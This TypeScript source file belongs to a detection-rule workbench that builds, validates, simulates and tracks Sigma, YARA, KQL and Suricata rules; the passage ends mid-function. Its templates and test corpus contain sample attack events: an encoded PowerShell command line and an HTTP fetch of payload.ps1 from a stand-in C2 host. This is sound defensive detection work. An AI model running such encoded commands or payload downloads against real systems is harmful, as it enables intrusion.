import { ScrollText, FileSearch, Terminal, ShieldAlert } from "lucide-react";
import { type Severity } from "@/lib/severity";
import { lifecycleNodeId, addEdge, eventDigest, type Edge } from "@/lib/provenance";
import { ALL_TECHNIQUES } from "@/data/mitre";

export type Format = "sigma" | "yara" | "kql" | "suricata";

export const FMT_ICONS = { sigma: ScrollText, yara: FileSearch, kql: Terminal, suricata: ShieldAlert } as const;

export function autoDetectFmt(text: string): Format | null {
  if (/^alert\s+(tcp|udp|http|dns|tls|ip)\s/im.test(text)) return "suricata";
  if (/^title:/m.test(text) && /^detection:/m.test(text)) return "sigma";
  if (/^rule\s/m.test(text) && /^\s{2}meta:/m.test(text)) return "yara";
  if (/\b(where\s|project\b|summarize\b)/i.test(text)) return "kql";
  return null;
}

export type Tpl = {
  rule: string;
  event: string;
  matcher: (event: string) => { hit: boolean; hits: string[] };
  /** canonical keywords the template matcher requires to fire */
  matchTokens: string[];
  technique: { id: string; name: string; tactic: string; platform: string; source: string };
  severity: Severity;
};

export type MitreMatch = { technique_id: string; technique: string; tactic: string; confidence: string; matched_keywords?: string[] };
export type MitreResult = { total_matches: number; matches: MitreMatch[]; note?: string };
export type GenResult = { sigma_yaml?: string; mitre_mapping?: { matches?: MitreMatch[] }; _show?: boolean };

export const TEMPLATES: Record<Format, Tpl> = {
  sigma: {
    rule: `title: Suspicious PowerShell EncodedCommand
id: 6f1f0c20-1111-4444-8888-123456789abc
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\\\\powershell.exe'
    CommandLine|contains: '-EncodedCommand'
  condition: selection
tags:
  - attack.t1059.001
level: high`,
    event: `powershell.exe -NoP -EncodedCommand SQBFAFgA`,
    matchTokens: ["powershell.exe", "-EncodedCommand"],
    matcher: (e) => {
      const hits: string[] = [];
      if (/powershell\.exe/i.test(e)) hits.push("powershell.exe");
      if (/-EncodedCommand/i.test(e)) hits.push("-EncodedCommand");
      return { hit: hits.length === 2, hits };
    },
    technique: { id: "T1059.001", name: "Command and Scripting Interpreter: PowerShell", tactic: "Execution", platform: "Windows", source: "Process creation (Sysmon 1, EID 4688)" },
    severity: "high",
  },
  yara: {
    rule: `rule Suspicious_PS_EncodedCommand {
  meta:
    author = "BeyondLabs"
    reference = "T1059.001"
  strings:
    $a = "EncodedCommand" ascii wide nocase
    $b = "-NoP" ascii wide nocase
  condition:
    all of them
}`,
    event: `powershell.exe -NoP -EncodedCommand SQBFAFgA`,
    matchTokens: ["EncodedCommand", "-NoP"],
    matcher: (e) => {
      const hits: string[] = [];
      if (/EncodedCommand/i.test(e)) hits.push("EncodedCommand");
      if (/-NoP/i.test(e)) hits.push("-NoP");
      return { hit: hits.length === 2, hits };
    },
    technique: { id: "T1059.001", name: "Command and Scripting Interpreter: PowerShell", tactic: "Execution", platform: "Strings / memory", source: "Strings / memory" },
    severity: "high",
  },
  kql: {
    rule: `DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where ProcessCommandLine has_any("EncodedCommand", "-enc ")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp desc`,
    event: `Timestamp=2026-06-25T10:42:13Z DeviceName=WS-014 AccountName=krish ProcessCommandLine="powershell.exe -NoP -EncodedCommand SQBFAFgA"`,
    matchTokens: ["powershell.exe", "EncodedCommand"],
    matcher: (e) => {
      const hits: string[] = [];
      if (/powershell\.exe/i.test(e)) hits.push("powershell.exe");
      if (/EncodedCommand|-enc /i.test(e)) hits.push("EncodedCommand");
      return { hit: hits.length >= 2, hits };
    },
    technique: { id: "T1059.001", name: "Command and Scripting Interpreter: PowerShell", tactic: "Execution", platform: "Defender XDR", source: "DeviceProcessEvents" },
    severity: "high",
  },
  suricata: {
    rule: `alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET HUNT Suspicious PowerShell Download In URI"; flow:established,to_server; http.method; content:"GET"; http.uri; content:".ps1"; nocase; pcre:"/\\/(payload|beacon|dropper)\\.ps1$/i"; classtype:trojan-activity; sid:2028911; rev:1;)`,
    event: `GET /payload.ps1 HTTP/1.1\r\nHost: c2.evil-corp.net\r\nUser-Agent: WindowsPowerShell/5.1\r\nAccept: */*\r\n\r\n`,
    matchTokens: ["payload.ps1", "GET"],
    matcher: (e) => {
      const hits: string[] = [];
      if (/GET/i.test(e)) hits.push("GET");
      if (/payload\.ps1/i.test(e)) hits.push("payload.ps1");
      return { hit: hits.length === 2, hits };
    },
    technique: { id: "T1105", name: "Ingress Tool Transfer", tactic: "Command and Control", platform: "Network IDS / Suricata", source: "HTTP Request Log" },
    severity: "high",
  },
};

export const SYNTAX: Record<Format, { kw: RegExp; str: RegExp; comment: RegExp }> = {
  sigma: { kw: /\b(title|id|status|logsource|product|category|detection|selection|condition|tags|level|description|author|references)\b/g, str: /'[^']*'|"[^"]*"/g, comment: /#.*$/gm },
  yara: { kw: /\b(rule|meta|strings|condition|ascii|wide|nocase|all|any|of|them|and|or|not)\b/g, str: /"[^"]*"/g, comment: /\/\/.*$/gm },
  kql: { kw: /\b(where|project|order by|desc|asc|has_any|has|contains|extend|summarize|count|by|let|datatable)\b/g, str: /"[^"]*"/g, comment: /\/\/.*$/gm },
  suricata: { kw: /\b(alert|drop|pass|reject|http|tcp|udp|dns|tls|ip|msg|flow|http\.method|http\.uri|http\.header|http\.host|content|pcre|nocase|classtype|sid|rev|priority|established|to_server|to_client|distance|within|depth|offset)\b/g, str: /"[^"]*"/g, comment: /#.*$/gm },
};

export function highlight(src: string, fmt: Format, matches: string[]) {
  const escape = (s: string) => s.replace(/[&<>]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]!));
  let html = escape(src);
  const s = SYNTAX[fmt];
  html = html.replace(s.comment, (m) => `<span class="text-muted-foreground italic">${m}</span>`);
  html = html.replace(s.str, (m) => `<span class="text-success">${m}</span>`);
  html = html.replace(s.kw, (m) => `<span class="text-primary">${m}</span>`);
  matches.forEach((m) => {
    const re = new RegExp(escape(m).replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "gi");
    html = html.replace(re, (x) => `<mark class="rounded bg-warning/25 px-0.5 text-warning-foreground">${x}</mark>`);
  });
  return html;
}

export function extractIocs(text: string): { ips: string[]; urls: string[]; hashes: string[] } {
  return {
    ips: Array.from(new Set(text.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) ?? [])),
    urls: Array.from(new Set(text.match(/https?:\/\/[^\s"']+/g) ?? [])),
    hashes: Array.from(new Set(text.match(/\b[A-Fa-f0-9]{32}\b|\b[A-Fa-f0-9]{40}\b|\b[A-Fa-f0-9]{64}\b/g) ?? [])),
  };
}

export function genReport(tpl: Tpl, result: { hit: boolean; hits: string[] }, rule: string): string {
  return [
    `# Detection Rule Report`,
    `**Technique:** ${tpl.technique.id} — ${tpl.technique.name}`,
    `**Tactic:** ${tpl.technique.tactic}`,
    `**Format:** ${tpl.technique.platform}`,
    `**Severity:** ${tpl.severity}`,
    `**Verdict:** ${result.hit ? "MATCH" : "NO MATCH"}`,
    `**Tokens matched:** ${result.hits.join(", ") || "—"}`,
    "", "## Rule Body",
    rule,
    "", "## Event",
    tpl.event,
  ].join("\n");
}

/* ── sample corpus simulation (Phase 2) ──────────────────── */

/** Expected classification of a corpus sample relative to the rule's technique. */
export type SampleExpected = "match" | "benign";

/** Verdict of a single corpus sample run: true/false positive/negative. */
export type Verdict = "tp" | "tn" | "fp" | "fn";

export interface CorpusSample {
  id: string;
  label: string;
  expected: SampleExpected;
  event: string;
}

/**
 * Deterministic sample corpus per rule format. `found` mirrors the rule's own
 * technique event; the others probe false negatives (partial keyword set) and
 * false positives (benign traffic carrying the same keywords).
 */
export const SIM_CORPUS: Record<Format, CorpusSample[]> = {
  sigma: [
    { id: "found", label: "found · encoded command", expected: "match", event: `powershell.exe -NoP -EncodedCommand SQBFAFgA` },
    { id: "partial", label: "partial · encoding only", expected: "match", event: `-EncodedCommand SQBFAFgA` },
    { id: "benign", label: "benign · file operation", expected: "benign", event: `Copy-Item C:\work\backup.q3 C:\archives\q3.ps1` },
    { id: "benign-keyword", label: "benign · docs mention", expected: "benign", event: `the powershell.exe -EncodedCommand flag is documented in runbook 41` },
  ],
  yara: [
    { id: "found", label: "found · encoded payload", expected: "match", event: `powershell.exe -NoP -EncodedCommand SQBFAFgA` },
    { id: "partial", label: "partial · -NoP only", expected: "match", event: `powershell.exe -NoP` },
    { id: "benign", label: "benign · log rotation", expected: "benign", event: `Logrotate cycle started: archive 14 files, rotating 2.3 GB` },
    { id: "benign-keyword", label: "benign · advisory text", expected: "benign", event: `Advisory S-26: operators should review any EncodedCommand use and the -NoP flag.` },
  ],
  kql: [
    { id: "found", label: "found · encoded command", expected: "match", event: `Timestamp=2026-06-25T10:42:13Z DeviceName=WS-014 AccountName=krish ProcessCommandLine="powershell.exe -NoP -EncodedCommand SQBFAFgA"` },
    { id: "partial", label: "partial · binary only", expected: "match", event: `Timestamp=2026-06-25T10:40:01Z DeviceName=WS-014 AccountName=svc-build ProcessCommandLine="powershell.exe -WinP"` },
    { id: "benign", label: "benign · volume mount", expected: "benign", event: `Timestamp=2026-06-25T10:40:02Z DeviceName=WS-014 AccountName=system ProcessCommandLine="mountvol.exe X: /S"` },
    { id: "benign-keyword", label: "benign · runbook run", expected: "benign", event: `Timestamp=2026-06-25T10:41:00Z DeviceName=WS-014 AccountName=krish ProcessCommandLine="powershell.exe -enc -NoP references in runbook 41"` },
  ],
  suricata: [
    { id: "found", label: "found · ps1 download", expected: "match", event: "GET /payload.ps1 HTTP/1.1\r\nHost: c2.evil-corp.net\r\nUser-Agent: WindowsPowerShell/5.1" },
    { id: "partial", label: "partial · benign ps1 request", expected: "match", event: "GET /scripts/update.ps1 HTTP/1.1\r\nHost: internal-repo.corp" },
    { id: "benign", label: "benign · standard web browsing", expected: "benign", event: "GET /index.html HTTP/1.1\r\nHost: intranet.corp\r\nUser-Agent: Mozilla/5.0" },
    { id: "benign-keyword", label: "benign · docs mention", expected: "benign", event: "GET /blog/powershell-scripting.html HTTP/1.1\r\nHost: dev-blogs.com" },
  ],
};

export interface CorpusSampleRun {
  id: string;
  label: string;
  expected: SampleExpected;
  hit: boolean;
  hits: string[];
  verdict: Verdict;
}

export interface CorpusSummary {
  matches: number;
  misses: number;
  falsePositives: number;
  /** share of expected matches actually caught (recall) */
  coverage: number;
  /** share of hits that were genuine matches (precision) */
  precision: number;
}

export interface CorpusRun {
  fmt: Format;
  samples: CorpusSampleRun[];
  summary: CorpusSummary;
}

/** Run the format's keyword matcher over the whole corpus. Pure and deterministic. */
export function runCorpus(fmt: Format): CorpusRun {
  const matcher = TEMPLATES[fmt].matcher;
  const samples = SIM_CORPUS[fmt].map((s) => {
    const r = matcher(s.event);
    const verdict: Verdict = r.hit ? (s.expected === "match" ? "tp" : "fp") : (s.expected === "match" ? "fn" : "tn");
    return { id: s.id, label: s.label, expected: s.expected, hit: r.hit, hits: r.hits, verdict };
  });
  const tp = samples.filter((s) => s.verdict === "tp").length;
  const fn = samples.filter((s) => s.verdict === "fn").length;
  const fp = samples.filter((s) => s.verdict === "fp").length;
  return {
    fmt,
    samples,
    summary: {
      matches: tp,
      misses: fn,
      falsePositives: fp,
      coverage: tp + fn === 0 ? 0 : tp / (tp + fn),
      precision: tp + fp === 0 ? 0 : tp / (tp + fp),
    },
  };
}

/** Stable digest of a corpus outcome — identical runs key the same simulation node. */
export function corpusDigest(run: CorpusRun): string {
  return `${run.fmt}|${run.samples.map((s) => `${s.id}:${s.verdict}`).sort().join("|")}`;
}

/* ── rule library categories (Phase 2) ───────────────────── */

/** Facets the rule library organizes by. */
export const RULE_CATEGORIES = ["windows", "linux", "cloud", "identity", "email", "network", "web"] as const;
export type RuleCategory = (typeof RULE_CATEGORIES)[number];

/** Keyword hint per category, used only when the rule carries no explicit category. */
const CATEGORY_HINTS: Record<RuleCategory, string[]> = {
  windows: ["windows", "process_creation", "sysmon", "event id 4688", "powershell", "registry"],
  linux: ["linux", "auditd", "bash", "cron", "journald"],
  cloud: ["cloud", "aws", "azure", "gcp", "okta", "s3", "cloudtrail"],
  identity: ["identity", "login", "kerberos", "adfs", "user_account", "secur id 4624"],
  email: ["email", "outlook", "exchange", "phish", "smtp"],
  network: ["network", "dns", "dns_query", "http", "tls", "firewall"],
  web: ["web", "iis", "apache", "nginx", "web_access", "url"],
};

/** Deterministic category of a rule: explicit field wins, else first keyword hit. */
export function ruleCategory(r: Pick<SavedRule, "category" | "rule">): RuleCategory | undefined {
  if (r.category) return r.category;
  const text = (r.rule || "").toLowerCase();
  for (const c of RULE_CATEGORIES) {
    if (CATEGORY_HINTS[c].some((h) => text.includes(h.toLowerCase()))) return c;
  }
  return undefined;
}

/** Rule library organized by category — count per facet (undefined → unfiled). */
export function categorizeRules(rules: SavedRule[]): Map<RuleCategory | undefined, number> {
  const m = new Map<RuleCategory | undefined, number>();
  for (const r of rules) {
    const c = ruleCategory(r);
    m.set(c, (m.get(c) ?? 0) + 1);
  }
  return m;
}

/* ── MITRE coverage (Phase 2) — Technique → Rules → Deployment ── */

/**
 * Technique ids a rule targets: the explicit `technique` field, `attack.*`
 * tags, and `attack.*` references inside the rule body (Sigma convention).
 * Deduplicated, normalized to uppercase.
 */
export function ruleTechniques(r: Pick<SavedRule, "technique" | "tags" | "rule">): string[] {
  const out = new Set<string>();
  const add = (raw: string) => {
    const id = raw.trim().toUpperCase();
    if (/^T\d{3,5}(?:\.\d{1,3})?$/.test(id)) out.add(id);
  };
  if (r.technique) add(r.technique);
  for (const t of r.tags ?? []) {
    const m = t.match(/attack\.(t\d+(?:\.\d+)?)/i);
    if (m) add(m[1]);
  }
  for (const m of (r.rule ?? "").matchAll(/attack\.(t\d+(?:\.\d+)?)/gi)) add(m[1]);
  return [...out];
}

export type CoverageStatus = "full" | "partial" | "gap";

export interface TechniqueCoverage {
  id: string;
  name: string;
  tactic: string;
  ruleCount: number;
  deployedCount: number;
  status: CoverageStatus;
  /** the technique is referenced by a case finding (`mapped-to` edge) */
  findingMapped: boolean;
}

/**
 * Coverage per technique, derived from the rule library and provenance:
 * `full` — ≥1 deployed rule; `partial` — rules exist but none deployed;
 * `gap` — findings map to the technique but no rule targets it. Techniques
 * with neither rules nor mapped findings are excluded.
 */
export function computeMitreCoverage(rules: SavedRule[], edges: Edge[]): TechniqueCoverage[] {
  const acc = new Map<string, { ruleCount: number; deployedCount: number; findingMapped: boolean }>();
  const ensure = (id: string) => {
    let a = acc.get(id);
    if (!a) { a = { ruleCount: 0, deployedCount: 0, findingMapped: false }; acc.set(id, a); }
    return a;
  };
  for (const r of rules) {
    for (const tid of ruleTechniques(r)) {
      const a = ensure(tid);
      a.ruleCount += 1;
      if (r.state === "deployed") a.deployedCount += 1;
    }
  }
  for (const e of edges) {
    if (e.relation === "mapped-to" && e.to.kind === "mitre") ensure(e.to.id).findingMapped = true;
  }
  const names = new Map(ALL_TECHNIQUES.map((t) => [t.id, t]));
  const rank: Record<CoverageStatus, number> = { gap: 0, partial: 1, full: 2 };
  return [...acc.entries()]
    .map(([id, a]): TechniqueCoverage => {
      const t = names.get(id);
      return {
        id,
        name: t?.name ?? id,
        tactic: t?.tactic ?? "",
        ruleCount: a.ruleCount,
        deployedCount: a.deployedCount,
        status: a.ruleCount > 0 ? (a.deployedCount > 0 ? "full" : "partial") : "gap",
        findingMapped: a.findingMapped,
      };
    })
    .sort((a, b) => rank[a.status] - rank[b.status] || b.ruleCount - a.ruleCount || a.id.localeCompare(b.id));
}

/* ── detection lifecycle (§4) ────────────────────────────── */

/** States of the detection node lifecycle state machine. `failed` is a transient validation outcome, never persisted. */
export type DetectionState = "draft" | "validated" | "approved" | "deployed" | "retired";

export const DETECTION_STATES: DetectionState[] = ["draft", "validated", "approved", "deployed", "retired"];

export const STATE_TONE: Record<DetectionState, "default" | "primary" | "warning" | "success" | "destructive" | "info"> = {
  draft: "default",
  validated: "info",
  approved: "primary",
  deployed: "success",
  retired: "destructive",
};

export type SavedRule = {
  id: string;
  name: string;
  format: Format;
  rule: string;
  event: string;
  created: number;
  updated: number;
  tags: string[];
  /** Stable slug assigned at creation; renames/edits keep identity (§3). */
  ruleKey: string;
  /** Current lifecycle state (§4). Legacy rules normalize to "draft". */
  state: DetectionState;
  /** Timestamp of the last state change (not content edit). */
  stateUpdated: number;
  /** Monotonic deployment counter — each deploy/rollback stamps a new deployment node. */
  version: number;
  /**
   * MITRE technique id (e.g. "T1059.001") the rule targets. Set when the
   * rule is scaffolded from a finding/technique signal or tagged explicitly;
   * absent for generic rules. Powers the correlation engine's
   * existing-detection dimension against analysis findings.
   */
  technique?: string;
  /** Library category facet (Phase 2). Set explicitly or inferred from rule text. */
  category?: RuleCategory;
};
const RULES_KEY = "ba.detection.rules.v2";

export function loadRules(): SavedRule[] {
  try { return JSON.parse(localStorage.getItem(RULES_KEY) || "[]").map(normalizeRule); } catch { return []; }
}
export function saveRules(r: SavedRule[]) {
  try { localStorage.setItem(RULES_KEY, JSON.stringify(r)); } catch {}
  try { window.dispatchEvent(new Event("search-index-invalidate")); } catch {}
}
export function genId() { return crypto.randomUUID?.() ?? `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`; }

/** Normalize legacy rules (no lifecycle fields) into the current shape. */
export function normalizeRule(r: Partial<SavedRule> & { id: string; name: string; format: Format; rule: string }): SavedRule {
  return {
    event: "",
    tags: [],
    created: Date.now(),
    updated: Date.now(),
    ...r,
    ruleKey: r.ruleKey ?? slugRuleKey(r.name, r.id),
    state: r.state ?? "draft",
    stateUpdated: r.stateUpdated ?? r.updated ?? Date.now(),
    version: r.version ?? 0,
  };
}

/** Stable slug assigned at creation. Identity survives renames because it's stored, not derived per-edit. */
export function slugRuleKey(name: string, id: string): string {
  const slug = name.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "").slice(0, 40) || "rule";
  return `${slug}-${id.slice(0, 6)}`;
}

/**
 * Transition table (§4): allowed (from, to) pairs plus rollback semantics.
 * draft→deployed, draft→retired, validated→deployed, deployed→validated,
 * approved→retired are forbidden.
 */
const ALLOWED_TRANSITIONS: [DetectionState, DetectionState][] = [
  ["draft", "validated"],
  ["validated", "approved"],
  ["validated", "draft"],
  ["approved", "deployed"],
  ["approved", "draft"],
  ["deployed", "retired"],
  ["deployed", "draft"],
  ["retired", "draft"],
];

export function canTransition(from: DetectionState, to: DetectionState): boolean {
  return ALLOWED_TRANSITIONS.some(([a, b]) => a === from && b === to);
}

/**
 * Apply a lifecycle transition. Pure — returns a new rule (or null when the
 * transition is forbidden). Rolls back to draft on revision; reactivation
 * from retired returns to draft by policy.
 */
export function transitionRule(rule: SavedRule, to: DetectionState): SavedRule | null {
  if (!canTransition(rule.state, to)) return null;
  return { ...rule, state: to, stateUpdated: Date.now() };
}

/* ── deterministic node ids (detection lifecycle, §3) ───── */

export function detectionNodeId(ruleKey: string): string {
  return lifecycleNodeId("detection", ruleKey);
}
export function simulationNodeId(ruleId: string, eventDigest: string): string {
  return lifecycleNodeId("simulation", `${ruleId}|${eventDigest}`);
}
export function deploymentNodeId(ruleId: string, version: number): string {
  return lifecycleNodeId("deployment", `${ruleId}|${version}`);
}
/** Deterministic alert node id (§3): `al-<fnv1a(deploymentId|eventDigest)>`. */
export function alertNodeId(deploymentId: string, digest: string): string {
  return lifecycleNodeId("alert", `${deploymentId}|${digest}`);
}

/* ── fires writer (§5) — alert nodes + edges ────────────── */

export type AlertInput = {
  /** Rule id of the deployment that fired. */
  ruleId: string;
  /** Stable rule key (identity survives renames). */
  ruleKey: string;
  /** Deployment version that produced the alert. */
  version: number;
  /** Triggering event text — keyed into the alert node id. */
  event: string;
  /** Writer label, default "alert-ingestion". */
  source?: string;
};

/**
 * Write a `fires` edge Deployment → Alert. The alert node is identified by
 * the deployment node + event digest, so the same deployment firing on the
 * same event re-asserts (addEdge is idempotent) and never duplicates.
 */
export function recordAlert(input: AlertInput): Edge {
  const depId = deploymentNodeId(input.ruleId, input.version);
  const digest = eventDigest(input.event);
  const alertId = alertNodeId(depId, digest);
  return addEdge({
    relation: "fires",
    from: { kind: "deployment", id: depId },
    to: { kind: "alert", id: alertId },
    source: input.source ?? "alert-ingestion",
    confidence: 0.9,
    reason: `${input.ruleKey} v${input.version} fired on event digest ${digest.slice(0, 8)}`,
  });
}

export type ValidationMsg = { type: "error" | "warning"; msg: string; line?: number };
export function validateRule(rule: string, fmt: Format): ValidationMsg[] {
  const out: ValidationMsg[] = [];
  if (!rule.trim()) { out.push({ type: "error", msg: "Rule body is empty" }); return out; }
  if (fmt === "sigma") {
    if (!/^[a-z]/m.test(rule)) out.push({ type: "error", msg: "Sigma rules should start with a top-level YAML key" });
    if (!/title:\s*\S/.test(rule)) out.push({ type: "error", msg: "Missing required field: title" });
    if (!/detection:/m.test(rule)) out.push({ type: "error", msg: "Missing required section: detection" });
    if (!/condition:\s*\S/.test(rule)) out.push({ type: "error", msg: "Missing required field: condition" });
    if (!/logsource:/m.test(rule)) out.push({ type: "warning", msg: "Missing logsource section — rule may be hard to deploy" });
    if (!/level:\s*\S/.test(rule)) out.push({ type: "warning", msg: "Missing level (severity) field" });
    if (/id:\s*\S/.test(rule) && !/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i.test(rule)) out.push({ type: "warning", msg: "id does not look like a UUID" });
    if (!/falsepositives:/m.test(rule)) out.push({ type: "warning", msg: "Missing falsepositives section — document expected noise or state 'unknown'" });
    if (!/references:/m.test(rule)) out.push({ type: "warning", msg: "Missing references — link the technique writeup or sample source" });
    if (!/description:\s*\S/.test(rule)) out.push({ type: "warning", msg: "Missing description — future readers get context only from the title" });
    lintSigmaCondition(rule, out);
  } else if (fmt === "yara") {
    if (!/^\s*rule\s+\w+/m.test(rule)) out.push({ type: "error", msg: "YARA rule must start with 'rule <name>'" });
    if (!/condition:/m.test(rule)) out.push({ type: "error", msg: "Missing required section: condition" });
    if ((rule.match(/\{/g)?.length ?? 0) !== (rule.match(/\}/g)?.length ?? 0)) out.push({ type: "error", msg: "Unbalanced braces — a rule or section is not closed" });
    if (!/meta:/m.test(rule)) out.push({ type: "warning", msg: "Missing meta section — add author/date/reference for provenance" });
    if (!/strings:/m.test(rule)) out.push({ type: "warning", msg: "No strings section — rule may never match" });
    if (/^\s*\$\w+\s*=\s*"[^"]*"\s*$/m.test(rule) === false && /strings:/m.test(rule)) out.push({ type: "warning", msg: "Strings section exists but no valid string definitions found" });
    lintYaraStrings(rule, out);
  } else if (fmt === "kql") {
    const stripped = rule.replace(/"[^"]*"/g, '""');
    let parens = 0;
    for (const ch of stripped) { if (ch === "(") parens++; else if (ch === ")") parens--; }
    if (parens > 0) out.push({ type: "error", msg: `${parens} unclosed '('` });
    else if (parens < 0) out.push({ type: "error", msg: `${-parens} extra ')'` });
    let brackets = 0;
    for (const ch of stripped) { if (ch === "[") brackets++; else if (ch === "]") brackets--; }
    if (brackets !== 0) out.push({ type: "error", msg: "Unbalanced square brackets" });
    if (!/\|/.test(rule)) out.push({ type: "warning", msg: "KQL query has no pipe operators — likely incomplete" });
    if (!/where\s/i.test(rule)) out.push({ type: "warning", msg: "No 'where' clause — query returns all rows" });
    if (/^\s*search\s/im.test(rule)) out.push({ type: "warning", msg: "'search' scans across tables/columns — prefer table-scoped 'where'" });
    if (!/project\s|\summarize\s|\stake\s|\slimit\s/i.test(rule)) out.push({ type: "warning", msg: "No projection/limit clause — consider project/take to bound output" });
  } else if (fmt === "suricata") {
    if (!/^(alert|drop|pass|reject|rejectsrc|rejectdst|rejectboth)\s+/i.test(rule.trim())) {
      out.push({ type: "error", msg: "Suricata rule must begin with an action: alert, drop, pass, reject" });
    }
    const headerMatch = rule.match(/^(alert|drop|pass|reject)\s+(\w+)\s+(\S+)\s+(\S+)\s+(->|<>)\s+(\S+)\s+(\S+)/i);
    if (!headerMatch) {
      out.push({ type: "error", msg: "Invalid Suricata rule header. Expected: <action> <proto> <src_ip> <src_port> -> <dst_ip> <dst_port> (<options>)" });
    }
    if (!/sid\s*:\s*\d+\s*;/i.test(rule)) {
      out.push({ type: "error", msg: "Missing required rule option: sid (Signature ID)" });
    }
    if (!/rev\s*:\s*\d+\s*;/i.test(rule)) {
      out.push({ type: "warning", msg: "Missing recommended rule option: rev (Revision number)" });
    }
    if (!/msg\s*:\s*"[^"]*"\s*;/i.test(rule)) {
      out.push({ type: "warning", msg: "Missing or unquoted rule option: msg (Alert message)" });
    }
    if (!/classtype\s*:\s*[\w-]+\s*;/i.test(rule)) {
      out.push({ type: "warning", msg: "Missing classtype option for alert categorization" });
    }
    const openParen = (rule.match(/\(/g) || []).length;
    const closeParen = (rule.match(/\)/g) || []).length;
    if (openParen !== closeParen) {
      out.push({ type: "error", msg: `Unbalanced parentheses in rule options (${openParen} open, ${closeParen} close)` });
    }
  }
  return out;
}

const SIGMA_COND_KEYWORDS = new Set(["and", "or", "not", "all", "any", "of", "them", "by", "count", "min", "max", "near"]);

function lintSigmaCondition(rule: string, out: ValidationMsg[]) {
  const detMatch = rule.match(/detection:([\s\S]*)$/);
  if (!detMatch) return;
  const body = detMatch[1];
  let baseIndent: number | null = null;
  const defined = new Set<string>();
  let cond = "";
  for (const line of body.split("\n")) {
    if (!line.trim()) continue;
    const indent = (line.match(/^[ \t]*/)?.[0] ?? "").length;
    const km = line.trim().match(/^([a-z_][a-z0-9_]*):[ \t]*(.*)$/i);
    if (baseIndent === null) {
      if (!km) continue;
      baseIndent = indent;
    } else if (indent !== baseIndent || !km) {
      continue;
    }
    const k = km![1].toLowerCase();
    if (k === "condition") cond = km![2];
    else if (k !== "timeframe") defined.add(k);
  }
  if (!cond) return;
  const tokens = new Set<string>();
  const prefixes: string[] = [];
  for (const m of cond.matchAll(/([a-z_][a-z0-9_]*)(\*)?/gi)) {
    if (SIGMA_COND_KEYWORDS.has(m[1].toLowerCase())) continue;
    if (m[2]) prefixes.push(m[1].toLowerCase());
    else tokens.add(m[1].toLowerCase());
  }
  for (const t of tokens) {
    if (!defined.has(t)) out.push({ type: "error", msg: `condition references "${t}" which is not defined under detection` });
  }
  for (const p of prefixes) {
    if (![...defined].some((d) => d.startsWith(p))) {
      out.push({ type: "error", msg: `condition references "${p}*" but no detection key starts with "${p}"` });
    }
  }
  for (const d of defined) {
    if (tokens.has(d) || prefixes.some((p) => d.startsWith(p))) continue;
    out.push({ type: "warning", msg: `detection key "${d}" is never referenced by the condition and will be ignored` });
  }
}

function lintYaraStrings(rule: string, out: ValidationMsg[]) {
  const strDefs = new Set<string>();
  for (const m of rule.matchAll(/^[ \t]*(\$[a-zA-Z0-9_]+)[ \t]*=/gm)) strDefs.add(m[1]);
  if (strDefs.size === 0) return;
  const condBody = rule.match(/condition:([\s\S]*?)(?:\n[ \t]*\}|[ \t]*$)/)?.[1] ?? "";
  const used = [...condBody.matchAll(/\$[a-zA-Z0-9_]+\*?/g)].map((m) => m[0]);
  for (const u of used) {
    if (u.endsWith("*")) {
      const prefix = u.slice(0, -1);
      if (![...strDefs].some((d) => d.startsWith(prefix))) {
        out.push({ type: "error", msg: `condition references "${u}" but no string starts with "${prefix}"` });
      }
      continue;
    }
    if (!strDefs.has(u)) out.push({ type: "error", msg: `condition references ${u} but it is not defined in strings` });
  }
  for (const d of strDefs) {
    const usedHere = used.some((u) => (u.endsWith("*") ? d.startsWith(u.slice(0, -1)) : u === d));
    if (!usedHere) out.push({ type: "warning", msg: `string ${d} is defined but never referenced in the condition` });
  }
}

/** Sigma ↔ KQL ↔ YARA conversion parity. Static, hand-maintained reference:
 *  what survives a format conversion and what gets lost. Values are honest
 *  judgments ("partial" = expressible but lossy or with rewrites), not
 *  claims about any specific converter tool. */
export type ParityCell = "yes" | "partial" | "no";
export interface ParityRow {
  construct: string;
  sigma: ParityCell;
  kql: ParityCell;
  yara: ParityCell;
  note: string;
}
export const CONVERSION_PARITY: ParityRow[] = [
  { construct: "field = value selection", sigma: "yes", kql: "yes", yara: "no", note: "YARA has no field model — only byte/regex/string matches; field semantics are lost." },
  { construct: "keyword anywhere in event", sigma: "yes", kql: "partial", yara: "yes", note: "Sigma keywords → KQL needs has_any over an index column or full-text search; YARA $strings match anywhere in the blob." },
  { construct: "regular expressions", sigma: "yes", kql: "yes", yara: "yes", note: "All three support regex, but dialects differ (RE2 vs KQL regex vs YARA PCRE-lite) — anchors and classes may need rewriting." },
  { construct: "case-insensitive matching", sigma: "yes", kql: "yes", yara: "yes", note: "Sigma |i modifier, KQL ~ operators / tolower(), YARA nocase — mechanical but per-expression work." },
  { construct: "boolean logic (and/or/not)", sigma: "yes", kql: "yes", yara: "yes", note: "Expressible everywhere; YARA composes via boolean ops on string hits, so structure differs." },
  { construct: "aggregations (count / timeframe)", sigma: "yes", kql: "yes", yara: "no", note: "Sigma aggregations map to KQL summarize; YARA evaluates one object — no aggregation concept." },
  { construct: "correlation across events", sigma: "partial", kql: "partial", yara: "no", note: "Sigma correlation rules are still maturing; KQL join exists but is expensive; YARA cannot correlate." },
  { construct: "proximity (within N bytes)", sigma: "no", kql: "no", yara: "yes", note: "YARA-only: string distance/offset conditions have no equivalent in the other two formats." },
  { construct: "file structure parsing (PE etc.)", sigma: "no", kql: "no", yara: "partial", note: "YARA modules (pe, elf, math) inspect structure; conversion to event-based formats drops this entirely." },
  { construct: "time windows on the query", sigma: "partial", kql: "yes", yara: "no", note: "KQL filters timestamps natively; Sigma relies on backend timeframes; YARA has no time concept." },
];

export type RuleField = { key: string; value: string };
export function analyzeRule(rule: string, fmt: Format): RuleField[] {
  const fields: RuleField[] = [];
  if (fmt === "sigma") {
    const mTitle = rule.match(/^title:\s*(.+)$/m);
